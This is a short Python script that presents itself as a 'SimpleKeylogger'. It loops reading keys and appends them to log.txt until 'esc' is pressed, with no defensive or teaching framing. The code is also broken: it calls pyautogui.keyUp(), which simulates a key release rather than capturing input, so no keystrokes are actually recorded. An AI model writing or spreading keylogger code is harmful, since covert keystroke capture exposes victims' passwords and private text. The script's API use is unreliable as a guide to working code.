import pyautogui

class SimpleKeylogger:
    def __init__(self):
        self.logger = ""
    
    def append_to_log(self, key_strike):
        self.logger += key_strike
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
        self.logger = ""
    
    def start(self):
        while True:
            key = pyautogui.keyUp()
            if key == "esc":
                break
            else:
                self.append_to_log(key)
                
SimpleKeylogger().start()
